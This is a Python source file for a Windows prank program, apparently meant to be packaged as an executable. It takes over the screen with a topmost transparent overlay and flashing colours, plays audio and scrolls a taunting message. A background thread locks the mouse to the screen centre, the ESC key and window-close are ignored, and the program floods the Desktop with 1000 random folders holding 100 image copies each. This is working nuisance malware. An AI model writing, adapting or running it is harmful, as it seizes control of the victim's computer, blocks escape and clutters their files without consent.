import pygame
import win32gui
import win32con
import win32api
import os
import time
import sys
import random
import string
import ctypes
import shutil
import pyautogui
import threading


# CONFIG CAOS 

QTD_PASTAS = 1000
TAMANHO_NOME = 10
INTERVALO = 0.01  # segundos entre pastas
DURACAO_ANIMACAO = 150  # segundos antes de fechar

# CONFIG VISUAL

TEMPO_ESPERA_INICIAL = 1.2
FPS = 60
COR_TRANSPARENTE = (255, 0, 255)  # magenta clássico pra ficar transaparente

TEXTO_IMG2 = "TA SENDO ABUSADO PELA LEYLEY      TA SENDO ABUSADO PELA LEYLEY     TA SENDO ABUSADO PELA LEYLEY"
COR_TEXTO = (255, 255, 255)
TAMANHO_FONTE = 49

# CAMINHOS (FUNCIONA NO PY E NO EXE )

def caminho(nome):
    if getattr(sys, 'frozen', False):
        # rodando como exe (PyInstaller)
        return os.path.join(sys._MEIPASS, nome)
    else:
        # rodando como .py
        return os.path.join(os.path.dirname(os.path.abspath(__file__)), nome)

def pegar_desktop_real():
    CSIDL_DESKTOP = 0
    buf = ctypes.create_unicode_buffer(260)
    ctypes.windll.shell32.SHGetFolderPathW(None, CSIDL_DESKTOP, None, 0, buf)
    return buf.value

DESKTOP = pegar_desktop_real()

# INIT

pygame.init()
pygame.mixer.init()
pygame.font.init()


# IMAGENS (SEM CONVERTER)

img1_raw = pygame.image.load(caminho("img1.png"))
img2_raw = pygame.image.load(caminho("img2.png"))


# TELA FULLSCREEN

info = pygame.display.Info()
TELA_LARGURA = info.current_w
TELA_ALTURA = info.current_h

screen = pygame.display.set_mode(
    (TELA_LARGURA, TELA_ALTURA),
    pygame.NOFRAME
)
pygame.display.set_caption("overlay")
clock = pygame.time.Clock()


# CONVERTE AGORA

img1 = img1_raw.convert_alpha()
img2 = img2_raw.convert_alpha()

#só essa ordem funcionou

# TRANSPARÊNCIA WINDOWS

hwnd = pygame.display.get_wm_info()["window"]

ex_style = win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE)
win32gui.SetWindowLong(
    hwnd,
    win32con.GWL_EXSTYLE,
    ex_style | win32con.WS_EX_LAYERED
)

win32gui.SetLayeredWindowAttributes(
    hwnd,
    win32api.RGB(*COR_TRANSPARENTE),
    0,
    win32con.LWA_COLORKEY
)

win32gui.SetWindowPos(
    hwnd,
    win32con.HWND_TOPMOST,
    0, 0, TELA_LARGURA, TELA_ALTURA,
    win32con.SWP_SHOWWINDOW
)

# TEXTO

fonte = pygame.font.SysFont("arial", TAMANHO_FONTE, bold=True)
texto_surface = fonte.render(TEXTO_IMG2, True, COR_TEXTO)
texto_y = TELA_ALTURA // 2 + 120


# CONTROLE PASTAS

ultimo_spawn_pasta = 0
pastas_criadas = 0

# FUNÇÕES

def sair():
    pygame.quit()
    sys.exit()

def checar_saida():
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            sair()
        if event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE:
            sair()

def desenhar_img_centralizada(img):
    screen.blit(
        img,
        (
            (TELA_LARGURA - img.get_width()) // 2,
            (TELA_ALTURA - img.get_height()) // 2
        )
    )

def tocar_audio(arq):
    pygame.mixer.music.load(arq)
    pygame.mixer.music.play()

def esperar_audio():
    while pygame.mixer.music.get_busy():
        checar_saida()
        clock.tick(FPS)

def travar_mouse():
    tela_x, tela_y = pyautogui.size()
    meio_x, meio_y = tela_x // 2, tela_y // 2
    while True:
        pyautogui.moveTo(meio_x, meio_y)
        time.sleep(0.01)  #quantidade de vezes que atualiza o comando para travar o mouse

def fundo_piscando_random():
    while True:
        cor = (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )
        if cor != COR_TRANSPARENTE:
            return cor

def mostrar_imagem(img):
    screen.fill(COR_TRANSPARENTE)
    desenhar_img_centralizada(img)
    pygame.display.update()

def checar_saida_bloqueada():
    # essa função basicamente ignora ESC e QUIT
    for event in pygame.event.get():
        pass  # não faz nada

def criar_pasta_aleatoria():
    nome = ''.join(
        random.choices(string.ascii_letters + string.digits, k=TAMANHO_NOME)
    )
    caminho_pasta = os.path.join(DESKTOP, nome)
    try:
        os.makedirs(caminho_pasta, exist_ok=True)

        # quantidade de cópias que você quer criar em cada pasta
        qtd_copias = 100
        for i in range(1, qtd_copias + 1):
            destino = os.path.join(caminho_pasta, f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA{i}.png")
            shutil.copy(caminho("TOMA.png"), destino)

    except Exception as e:
        print("Erro ao criar pasta ou copiar imagem:", e)

def animacao_zoom_com_texto(img):
    global ultimo_spawn_pasta, pastas_criadas

    texto_x = TELA_LARGURA
    velocidade_texto = 130
    inicio_animacao = pygame.time.get_ticks()

    while True:
        checar_saida_bloqueada()
        agora = pygame.time.get_ticks()

        # CRIA PASTAS 
        if pastas_criadas < QTD_PASTAS:
            if agora - ultimo_spawn_pasta > INTERVALO * 1000:
                criar_pasta_aleatoria()
                ultimo_spawn_pasta = agora
                pastas_criadas += 1

        # TEXTO ANDANDO
        delta = clock.get_time() / 1000
        texto_x -= velocidade_texto * delta
        if texto_x < -texto_surface.get_width():
            texto_x = TELA_LARGURA

        # FUNDO INSANO
        if (agora // 40) % 2 == 0:
            screen.fill(fundo_piscando_random())
        else:
            screen.fill(COR_TRANSPARENTE)

        desenhar_img_centralizada(img)
        screen.blit(texto_surface, (texto_x, texto_y))

        pygame.display.update()
        clock.tick(FPS)

        # FINALIZA APÓS DURAÇÃO
        if (agora - inicio_animacao) / 1000 > DURACAO_ANIMACAO:
            break


threading.Thread(target=travar_mouse, daemon=True).start() # separa a thread e roda sem precisar estar na sequencia


mostrar_imagem(img1)

inicio = time.time()
while time.time() - inicio < TEMPO_ESPERA_INICIAL:
    checar_saida_bloqueada() 
    clock.tick(FPS)

tocar_audio(caminho("audio.mp3"))
esperar_audio()


tocar_audio(caminho("audio2.mp3"))
animacao_zoom_com_texto(img2)


sair()
